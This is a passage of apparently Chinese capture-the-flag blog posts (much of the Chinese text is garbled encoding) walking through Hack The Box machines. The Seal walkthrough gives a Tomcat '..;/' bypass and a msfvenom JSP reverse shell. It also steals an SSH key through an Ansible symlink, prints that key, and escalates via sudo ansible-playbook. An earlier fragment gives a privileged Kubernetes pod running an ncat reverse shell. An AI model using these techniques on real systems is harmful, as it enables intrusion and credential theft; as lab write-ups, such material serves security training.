eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# cat root.txt fd72e8e095033f233d31c383e5c0391b æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶ ## é¢˜å¤–è¯ è¿™å‡ å¤©äº‹æƒ…æœ‰ç‚¹å¤šï¼Œå†åŠ ä¸Šä¸€äº›è¿™æ ·é‚£æ ·çš„æƒ…å†µå§ï¼Œå¯¼è‡´æ¯”è¾ƒå¿™ã€‚æ‰€ä»¥è¿™æ¬¡çš„é¶åœºå°±æ²¡æœ‰å†™çš„éå¸¸ç»†è‡´ï¼Œæœ‰å¾ˆå¤šä¸œè¥¿éƒ½æ˜¯ä¸€ä¸‹å°±ç•¥è¿‡äº†ï¼Œè¯·å¤§å®¶è§è°…ã€‚ç­‰è¿‡æ®µæ—¶é—´å¿™å®Œäº†å°±ä¼šæ¢å¤è´¨é‡ã€‚ æœ€åä¸€æ­¥å¦‚æœæƒ³è¦è·å¾—ä¸€ä¸ªshellï¼Œå°±ä½¿ç”¨è¿™ä¸ªè„šæœ¬ apiVersion: v1 kind: Pod metadata: name: everything-allowed-revshell-pod labels: app: pentest spec: hostNetwork: true hostPID: true hostIPC: true containers: - name: everything-allowed-pod image: raesene/ncat command: [ &quot;/bin/sh&quot;, &quot;-c&quot;, &quot;--&quot; ] args: [ &quot;ncat --ssl $HOST $PORT -e /bin/bash;&quot; ] securityContext: privileged: true volumeMounts: - mountPath: /host name: noderoot #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name volumes: - name: noderoot hostPath: path: /","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Seal - Hackthebox","slug":"Hackthebox - Seal","date":"2021-07-12T11:38:36.000Z","updated":"2023-05-20T03:03:13.000Z","comments":true,"path":"2021/07/12/Hackthebox - Seal/","link":"","permalink":"http://www.lucifiel.com/2021/07/12/Hackthebox%20-%20Seal/","excerpt":"","text":"Hackthebox - Sealé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨Nmapè¿›è¡Œä¿¡æ¯æœé›†nmap -A -sS -sC -sV -p- 10.10.10.250 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.250 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-12 12:42 CST Nmap scan report for 10.10.10.250 Host is up (0.24s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |_Not valid after: 2022-05-05T10:24:03 | tls-alpn: |_ http/1.1 | tls-nextprotoneg: |_ http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Mon, 12 Jul 2021 05:05:34 GMT | Set-Cookie: JSESSIONID=node01f74sr5qgmlr67kq6xg2imreb3.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | GetRequest: | HTTP/1.1 401 Unauthorized | Date: Mon, 12 Jul 2021 05:05:32 GMT | Set-Cookie: JSESSIONID=node071ucs4ccblk71m8qso25gjtua1.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | HTTPOptions: | HTTP/1.1 200 OK | Date: Mon, 12 Jul 2021 05:05:33 GMT | Set-Cookie: JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Allow: GET,HEAD,POST,OPTIONS | Content-Length: 0 | RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 71 | Connection: close | &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character OTEXT=0x80&lt;/pre&gt; | RTSPRequest: | HTTP/1.1 505 Unknown Version | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 58 | Connection: close | &lt;h1&gt;Bad Message 505&lt;/h1&gt;&lt;pre&gt;reason: Unknown Version&lt;/pre&gt; | Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close | &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x4&lt;/pre&gt; | Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |_ &lt;h1&gt;Bad Message 400&lt;/h1&gt;&lt;pre&gt;reason: Illegal character CNTL=0x5&lt;/pre&gt; | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn&#39;t have a title (text/html;charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.91%I=7%D=7/12%Time=60EBCAB6%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,F4,&quot;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDate:\\x20Mon,\\x2012\\x2 SF:0Jul\\x202021\\x2005:05:32\\x20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node071ucs SF:4ccblk71m8qso25gjtua1\\.node0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu SF:,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html SF:;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(HTTPOptions,108,&quot;HTT SF:P/1\\.1\\x20200\\x20OK\\r\\nDate:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:33\\x SF:20GMT\\r\\nSet-Cookie:\\x20JSESSIONID=node01dhmxhla4mm47fdkiw6xmfoxq2\\.nod SF:e0;\\x20Path=/;\\x20HttpOnly\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x20 SF:00:00:00\\x20GMT\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nAllow:\\x SF:20GET,HEAD,POST,OPTIONS\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r(RTSPRequest SF:,AD,&quot;HTTP/1\\.1\\x20505\\x20Unknown\\x20Version\\r\\nContent-Type:\\x20text/ht SF:ml;charset=iso-8859-1\\r\\nContent-Length:\\x2058\\r\\nConnection:\\x20close\\ SF:r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20505&lt;/h1&gt;&lt;pre&gt;reason:\\x20Unknown\\x20Version SF:&lt;/pre&gt;&quot;)%r(FourOhFourRequest,F4,&quot;HTTP/1\\.1\\x20401\\x20Unauthorized\\r\\nDa SF:te:\\x20Mon,\\x2012\\x20Jul\\x202021\\x2005:05:34\\x20GMT\\r\\nSet-Cookie:\\x20J SF:SESSIONID=node01f74sr5qgmlr67kq6xg2imreb3\\.node0;\\x20Path=/;\\x20HttpOnl SF:y\\r\\nExpires:\\x20Thu,\\x2001\\x20Jan\\x201970\\x2000:00:00\\x20GMT\\r\\nConten SF:t-Type:\\x20text/html;charset=utf-8\\r\\nContent-Length:\\x200\\r\\n\\r\\n&quot;)%r( SF:Socks5,C3,&quot;HTTP/1\\.1\\x20400\\x20Illegal\\x20character\\x20CNTL=0x5\\r\\nCont SF:ent-Type:\\x20text/html;charset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nC SF:onnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x SF:20Illegal\\x20character\\x20CNTL=0x5&lt;/pre&gt;&quot;)%r(Socks4,C3,&quot;HTTP/1\\.1\\x2040 SF:0\\x20Illegal\\x20character\\x20CNTL=0x4\\r\\nContent-Type:\\x20text/html;cha SF:rset=iso-8859-1\\r\\nContent-Length:\\x2069\\r\\nConnection:\\x20close\\r\\n\\r\\ SF:n&lt;h1&gt;Bad\\x20Message\\x20400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20character\\x20 SF:CNTL=0x4&lt;/pre&gt;&quot;)%r(RPCCheck,C7,&quot;HTTP/1\\.1\\x20400\\x20Illegal\\x20characte SF:r\\x20OTEXT=0x80\\r\\nContent-Type:\\x20text/html;charset=iso-8859-1\\r\\nCon SF:tent-Length:\\x2071\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;h1&gt;Bad\\x20Message\\x2 SF:0400&lt;/h1&gt;&lt;pre&gt;reason:\\x20Illegal\\x20character\\x20OTEXT=0x80&lt;/pre&gt;&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/12%OT=22%CT=1%CU=41179%PV=Y%DS=2%DC=T%G=Y%TM=60EBCAE OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 241.94 ms 10.10.14.1 2 242.04 ms 10.10.10.250 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 716.52 seconds ä»ä¸Šé¢çš„æ‰«æç»“æœï¼Œæˆ‘ä»¬å¾—åˆ°äº†å‡ ä¸ªä¿¡æ¯ - å¼€å¯äº†22ã€443å’Œ8080ç«¯å£ - 8080ç«¯å£æ˜¯ä¸€ä¸ªhttpæœåŠ¡ - 8080ç«¯å£æ˜¾ç¤º401ï¼Œä½†å¯ä»¥è®¿é—® æˆ‘ä»¬è®¿é—®ä¸€ä¸‹8080ç«¯å£ å‘ç°è¿™æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œä½¿ç”¨çš„cmsæ˜¯gitbucket éšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»é™†åï¼Œå‘ç°äº†å…³äºnginxå’Œtomcatçš„ä¸œè¥¿ï¼Œç›®å‰æ€€ç–‘è¯¥ç³»ç»Ÿä½¿ç”¨äº†nginxæˆ–è€…tomcatè¿›è¡Œæ­å»º ç™»é™†åå‘ç°äº†ä¸€ä¸ªåä¸ºseal_marketçš„repoï¼Œè¿™åº”è¯¥æ˜¯443ç«¯å£çš„ä»£ç åº“ã€‚ä½†æˆ‘ä»¬æ— æ³•é€šè¿‡IPè¿›è¡Œè®¿é—®443ç«¯å£ï¼Œåº”è¯¥æ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ªåŸŸå echo 10.10.10.250 seal.htb &gt;&gt; /etc/hosts è¿è¡Œåå‘ç°ç¡®å®8080ç«¯å£çš„gitbucketæ˜¯443ç«¯å£çš„ä»£ç åº“ æˆ‘ä»¬åœ¨8080ç«¯å£ä¸Šå¯ä»¥çœ‹åˆ°æœ‰ä¸€äº›å¾…åŠäº‹é¡¹ Remove mutual authentication for dashboard, setup registration and login features. Deploy updated tomcat configuration. Disable manager and host-manager. åœ¨å°è¯•æ›´æ–° tomcat/tomcat-users.xml æ–‡ä»¶çš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†tomcatçš„è´¦å·å¯†ç  http://10.10.10.250:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 username = tomcat password = 42MrHBf*z8{Z% åœ¨å°è¯•æŸ¥çœ‹robots.txtçš„æ—¶å€™ï¼Œæç¤º404ï¼Œä½†ä»è¿™ä¸ª404çŠ¶æ€é¡µé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œè¯¥æœåŠ¡å™¨ä½¿ç”¨äº†tomcatï¼Œå¹¶ä¸”æˆ‘ä»¬æ‰‹é‡Œæ‹¿åˆ°äº†tomcatçš„è´¦å·å¯†ç ï¼Œé‚£æˆ‘ä»¬å°±ç›´æ¥ç™»å½•å§ https://seal.htb/manager/status ç›´æ¥ä½¿ç”¨tomcaté»˜è®¤çš„åœ°å€è¿›è¡Œç™»å½•ï¼Œç„¶åè¿›åˆ°äº†tomcatçš„ç®¡ç†é¡µé¢ ## æ¼æ´åˆ©ç”¨ https://seal.htb/manager/status/..;/html æˆ‘ä»¬ç›´æ¥ä½¿ç”¨msfvenomç”Ÿæˆä¸€ä¸ªwaré©¬ï¼Œç„¶åä¸Šä¼ åˆ©ç”¨å³å¯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war -o shell.war ç„¶åå»ä¸Šä¼ åˆ°é¶æœºé‡Œ ä¸Šä¼ çš„æ—¶å€™æç¤º403ï¼Œæœ‰ç‚¹è¿·æƒ‘ã€‚ ç»è¿‡å„ç§å°è¯•åå‘ç°ï¼Œè¿™æ˜¯ç™½åå•è¿‡æ»¤ï¼Œå’±ä»¬éœ€è¦æŠ“åŒ…ç„¶åç»•è¿‡ä¸€ä¸‹ åŸURL POST /manager/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1 ä¿®æ”¹ä¸º POST /manager/status/..;/html/upload;jsessionid=55F7E6377E4EE40C4466AB9F3403C5C9?org.apache.catalina.filters.CSRF_NONCE=229A49D013A85C24C1703530CB2440AD HTTP/1.1 å’±ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒshellæˆåŠŸä¸Šä¼ ï¼Œå’±ä»¬æœ¬åœ°ä½¿ç”¨ncç›‘å¬ä¸€ä¸ªç«¯å£ nc -nvlp 4444 ç„¶åè®¿é—®ä¸€ä¸‹shellé¡µé¢ https://seal.htb/shell/ ä½¿ç”¨python3è·å–ä¸€ä¸ªç¨³å®šçš„shellé“¾æ¥ python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; æˆåŠŸè·å¾—ä¸€ä¸ªshell â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.250] 32984 python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; tomcat@seal:/var/lib/tomcat9$ tomcat@seal:/home/luis$ ls -la ls -la total 51320 drwxr-xr-x 9 luis luis 4096 May 7 07:01 . drwxr-xr-x 3 root root 4096 May 5 12:52 .. drwxrwxr-x 3 luis luis 4096 May 7 06:00 .ansible lrwxrwxrwx 1 luis luis 9 May 5 12:57 .bash_history -&gt; /dev/null -rw-r--r-- 1 luis luis 220 May 5 12:52 .bash_logout -rw-r--r-- 1 luis luis 3797 May 5 12:52 .bashrc drwxr-xr-x 3 luis luis 4096 May 7 07:00 .cache drwxrwxr-x 3 luis luis 4096 May 5 13:45 .config drwxrwxr-x 6 luis luis 4096 Jul 12 06:14 .gitbucket -rw-r--r-- 1 luis luis 52497951 Jan 14 02:51 gitbucket.war drwxrwxr-x 3 luis luis 4096 May 5 13:41 .java drwxrwxr-x 3 luis luis 4096 May 5 14:33 .local -rw-r--r-- 1 luis luis 807 May 5 12:52 .profile drwx------ 2 luis luis 4096 May 7 06:10 .ssh -r-------- 1 luis luis 33 Jul 12 06:15 user.txt åœ¨ç”¨æˆ·ç›®å½•luisä¸‹æ‰¾åˆ°äº†user.txtæ–‡ä»¶ï¼Œä½†æˆ‘ä»¬æ²¡æœ‰æƒé™è®¿é—®ï¼Œä¸è¿‡å­˜åœ¨ä¸€ä¸ª.sshç›®å½•ï¼Œå¹¶ä¸”æˆ‘ä»¬æ˜¯æœ‰æƒé™è¿›è¡Œè®¿é—®çš„ï¼Œæˆ‘ä»¬è®¿é—®çœ‹çœ‹ åœ¨ç›®å½•/opt/backups/playbookä¸­ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªrum.ymlæ–‡ä»¶ï¼Œå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹å†…å®¹ - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: &quot;/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz&quot; - name: Clean file: state: absent path: /opt/backups/files/ æ€è·¯è¿™ä¸å°±æ¥äº†å—~ æ ¹æ®è§£è¯»run.ymlæ–‡ä»¶ï¼Œå’±ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªæŒ‡å‘luisçš„id_rsaçš„é“¾æ¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ”¾åˆ°/uploadsç›®å½•ä¸­ /opt/backups/archives ln -s ~/home/luis/.ssh/id_rsa /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/id_rsa cp backup-2021-07-12-08:46:33.gz /dev/shm cd /dev/shm mv backup-2021-07-12-08:46:33.gz backup.tar.gz tar -xvf backup.tar.gz åœ¨ç›®å½•/dev/shm/dashboard/uploadsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„id_rsaæ–‡ä»¶ï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹å†…å®¹ -----BEGIN OPENSSH PRIVATE KEY----- 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 u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE= -----END OPENSSH PRIVATE KEY----- å’±ä»¬ä¿å­˜åˆ°æœ¬åœ°ï¼Œä½¿ç”¨sshè¿›è¡Œç™»å½• chmod 600 id_rsa ssh luis@10.10.10.250 -i id_rsa â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# ssh luis@10.10.10.250 -i id_rsa Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Mon 12 Jul 2021 09:00:29 AM UTC System load: 0.04 Usage of /: 46.4% of 9.58GB Memory usage: 19% Swap usage: 0% Processes: 183 Users logged in: 0 IPv4 address for eth0: 10.10.10.250 IPv6 address for eth0: dead:beef::250:56ff:feb9:af64 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Fri May 7 07:00:18 2021 from 10.10.14.2 luis@seal:~$ æˆåŠŸè·å¾—useræƒé™ luis@seal:~$ cat user.txt e2f0032d0a9f2ec1d750505f6789b8e2 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ luis@seal:~$ sudo -l Matching Defaults entries for luis on seal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User luis may run the following commands on seal: (ALL) NOPASSWD: /usr/bin/ansible-playbook * ä½¿ç”¨sudo -læŸ¥çœ‹sudoæƒé™åå‘ç°ï¼Œå’±ä»¬å¯ä»¥ä»¥rootæƒé™æ‰§è¡Œansible-playebook å‚è€ƒèµ„æ–™ https://docs.ansible.com/ansible/latest/user/guide/playbooks.html åˆ›å»ºä¸€ä¸ªåä¸ºroot.ymlçš„æ–‡ä»¶ - name: Ansible Copy Example Local to Remote hosts: localhost tasks: - name: copying file with playbook become: true copy: src: /root/root.txt dest: /dev/shm owner: luis group: luis mode: 0777 ä½¿ç”¨sudo &#x2F;usr&#x2F;bin&#x2F;ansible-playbookæ‰§è¡Œroot.ymlæ–‡ä»¶ luis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook root.yml [WARNING]: provided hosts list is empty, only localhost is available. Note that the implicit localhost does not match &#39;all&#39; PLAY [Ansible Copy Example Local to Remote] ********************************************************************************************************************************************************************** TASK [Gathering Facts] ******************************************************************************************************************************************************************************************* ok: [localhost] TASK [copying file with playbook] ******************************************************************************************************************************************************************************** changed: [localhost] PLAY RECAP ******************************************************************************************************************************************************************************************************* localhost : ok=2 changed=1 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 luis@seal:/dev/shm$ ls passwd root.txt root.yml luis@seal:/dev/shm$ cat root.txt a18fdff4cccc7a1b0ef961fa8f007756 æˆåŠŸè·å¾—rootæƒé™çš„flag","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Proper - Hackthebox","slug":"Hackthebox - Proper","date":"2021-07-11T11:38:36.000Z","updated":"2023-05-20T02:54:05.000Z","comments":true,"path":"2021/07/11/Hackthebox - Proper/","link":"","permalink":"http://www.lucifiel.com/2021/07/11/Hackthebox%20-%20Proper/","excerpt":"","text":"Hackthebox - Properé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›† é¦–å…ˆä½¿ç”¨Nmapè¿›è¡Œä¿¡æ¯æœé›†nmap -A -sS -sC -sV -p- 10.10.10.231 â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop] â””â”€# nmap -A -sS -sC -sV -p- 10.10.10.231 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-10 13:09 CST Nmap scan report for 10.10.10.231 Host is up (0.24s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: 